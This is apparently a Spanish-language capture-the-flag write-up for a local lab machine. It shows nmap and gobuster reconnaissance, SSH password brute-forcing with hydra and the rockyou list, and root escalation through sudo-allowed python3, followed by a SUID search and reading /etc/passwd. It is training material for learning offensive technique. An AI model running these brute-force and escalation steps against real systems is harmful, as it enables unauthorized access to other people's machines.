Descargamos arvhivo

```bash
unzip pequeñas-mentirosas.zip
sudo bash auto_deploy.sh pequeñas-mentirosas.tar
```

![[Pasted image 20260324183023.png]]

```bash
ping -c 1 172.17.0.2
ping -c 1 172.17.0.2 -R
nmap -sn 172.17.0.2
```

```bash
nmap -p- --open --min-rate 5000 -A -sS -Pn -n -vvv 172.17.0.2 -oN nmap
```
![[Pasted image 20260324183312.png]]

web:
![[Pasted image 20260324183358.png]]

Fuzzing :

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
```

No encontramos nada

```bash
 gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```
Curl:
```bash
curl http://172.17.0.2 -I
curl http://172.17.0.2

<html><body><h1>Pista: Encuentra la clave para A en los archivos.</h1></body></html>

```

Probamos searchsploit
```bash
-> searchsploit OpenSSH 9.2p1
Exploits: No Results
Shellcodes: No Results
                                                  
❯ searchsploit Apache httpd 2.4.62
Exploits: No Results
Shellcodes: No Results             
```


Probamos ataque fuerza bruta con la pista que decia encuentra una A. 

```bash
hydra -l A -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
hydra -L <(echo -e "a\nA") -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

probamos con gobsuter con alguna extension mas como zip
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip
```

Pequeñas mentirosas es una serie asique...
![[Pasted image 20260324185523.png]]

```bash
echo -e "spencer\nhanna\naria\nemily\nalison\nmona" > usuarios.txt
 hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![[Pasted image 20260324185701.png]]

![[Pasted image 20260324185735.png]]

```bash
sudo -l

(ALL) NOPASSWD: /usr/bin/python3

sudo -uroot /usr/bin/python3 

```
![[Pasted image 20260324190015.png]]

```bash
cd ..
ls
root@a8dee58d515c:/home# ls
a  spencer
cd a
```

Inteamos entrar en a:
```bash
hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

contraseña secret

find / -perm -4000 2>/dev/null
cat /etc/passwd
su spencer

#obsevamos el usuario spencer, hariamos pivoting
```

